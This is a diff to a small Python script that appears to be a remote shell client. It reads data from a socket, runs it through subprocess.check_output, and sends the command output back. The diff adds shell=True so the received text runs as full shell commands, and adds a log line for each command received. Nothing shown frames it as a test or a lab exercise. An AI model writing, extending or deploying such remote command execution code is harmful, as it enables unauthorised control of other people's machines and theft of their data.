@@ -23,7 +23,7 @@ def get_ip():
 def handle_payload(cmd, *args, **kwargs):
     # cli_args = args + kwargs.items()
     command_payload = [cmd.decode('utf-8')] + list(args)
-    response = subprocess.check_output(command_payload)
+    response = subprocess.check_output(command_payload, shell=True)
     return response
 
 def main(sock_addr, sock_port):
@@ -51,6 +51,7 @@ def main(sock_addr, sock_port):
         while True:
             try:
                 data = sock.recv(1024)
+                print(f'Received at : {datetime.now()} << {data}')
                 # handle payload
                 capture = handle_payload(cmd=data)
                 sock.sendall(capture)
